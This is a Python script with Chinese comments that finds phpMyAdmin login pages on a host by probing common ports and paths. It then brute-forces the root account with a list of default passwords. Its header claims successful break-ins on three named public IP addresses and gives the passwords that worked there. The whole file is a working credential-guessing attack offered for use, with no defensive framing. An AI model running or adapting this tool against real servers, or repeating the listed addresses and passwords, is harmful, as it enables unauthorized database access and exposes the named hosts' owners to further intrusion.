#!/usr/bin/env python3
"""phpMyAdmin弱口令批量测试(实战验证: 124.71.142.158 root/123456, 150.158.95.91+81.70.245.25 root/root)
用法: python3 pma_login.py <host[:port]> [user] [密码...]
"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def find_pma(host):
    """多路径多端口找phpMyAdmin"""
    for port in ["80","8080","8980","9096","8888","999"]:
        for path in ["/phpmyadmin/", "/phpMyAdmin/", "/pma/"]:
            try:
                req = urllib.request.Request(f"http://{host}:{port}{path}", headers={"User-Agent":"Mozilla/5.0"})
                r = urllib.request.urlopen(req, timeout=4, context=ctx)
                body = r.read().decode("utf-8","ignore")
                if "phpMyAdmin" in body or "pma_username" in body:
                    return port, path
            except Exception:
                pass
    return None

def try_login(host, port, path, user, pw):
    for attempt in range(3):
        try:
            op = new_opener()
            r = op.open(f"http://{host}:{port}{path}", timeout=8)
            html = r.read().decode("utf-8","ignore")
            m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
            if not m: return "NOTOKEN"
            data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
            op.open(urllib.request.Request(f"http://{host}:{port}{path}index.php", data=data), timeout=8).read()
            r = op.open(f"http://{host}:{port}{path}index.php", timeout=8)
            body = r.read().decode("utf-8","ignore")
            if "Cannot log in" in body or "#1045" in body:
                return "FAIL"
            if "logout" in body or "navigation" in body or "server_databases" in body:
                return "SUCCESS"
            return "UNKNOWN"
        except Exception:
            if attempt == 2: return "ERR"
            time.sleep(1)
    return "ERR"

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else input("host: ")
    user = sys.argv[2] if len(sys.argv) > 2 else "root"
    pwds = sys.argv[3:] or ["root","123456","admin","12345678","mysql","admin123","password"]
    found = find_pma(host)
    if not found:
        print(f"{host}: 无phpMyAdmin"); sys.exit(1)
    port, path = found
    print(f"{host}:{port} phpMyAdmin@{path}", flush=True)
    for pw in pwds:
        r = try_login(host, port, path, user, pw)
        if r == "SUCCESS":
            print(f"!!! {user}/{pw} 登录成功!", flush=True)
            sys.exit(0)
        print(f"  {user}/{pw}: {r}", flush=True)
        time.sleep(0.3)
    print("无命中")
